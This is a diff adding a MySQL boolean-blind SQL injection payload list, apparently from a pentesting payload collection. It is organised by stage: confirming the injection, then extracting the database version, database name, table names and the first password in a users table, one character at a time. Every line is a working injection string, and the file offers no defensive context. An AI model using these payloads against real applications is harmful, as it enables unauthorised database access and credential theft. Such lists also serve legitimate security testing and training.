@@ -1,0 +1,27 @@
+# MySQL — Boolean Blind Payloads
+# Compare true vs false responses to extract data char by char
+
+# --- Confirm boolean blind ---
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+' AND SUBSTRING(version(),1,1)='5'--
+
+# --- Version extraction ---
+' AND SUBSTRING(version(),1,1)='5'--
+' AND SUBSTRING(version(),1,1)='8'--
+' AND ASCII(SUBSTRING(version(),1,1))>52--
+
+# --- Database name extraction ---
+' AND SUBSTRING(database(),1,1)='a'--
+' AND ASCII(SUBSTRING(database(),1,1))>96--
+' AND LENGTH(database())=5--
+
+# --- Table name extraction ---
+' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--
+
+# --- User/password extraction ---
+' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>96--
